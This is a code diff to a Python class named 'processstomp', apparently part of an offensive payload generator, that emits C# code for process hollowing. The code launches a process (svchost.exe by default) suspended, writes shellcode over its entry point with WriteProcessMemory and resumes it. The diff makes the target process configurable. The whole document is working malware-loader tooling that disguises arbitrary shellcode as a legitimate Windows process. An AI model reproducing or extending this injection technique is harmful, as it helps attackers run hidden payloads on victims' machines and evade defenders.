@@ -2,7 +2,9 @@ from string import Template
 
 class processstomp:
     def __init__(self, arguments):
-        pass
+        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
+        if 'target' in arguments:
+            self.target = arguments['target'].replace('\\','\\\\')
 
     def imports(self) -> list[str]:
         return ["using System;",
@@ -35,11 +37,11 @@ class processstomp:
 """
 
     def template(self) -> str:
-        return """
+        return Template("""
             STARTUPINFO si = new STARTUPINFO();
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
 
-            CreateProcess(null, "C:\\\\Windows\\\\System32\\\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+            CreateProcess(null, "$target", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
 
             PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
             uint tmp = 0;
@@ -71,4 +73,4 @@ class processstomp:
 
             WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, {shellcodeSize}, out nRead);
             ResumeThread(pi.hThread);
-"""
+""").substitute(target=self.target)
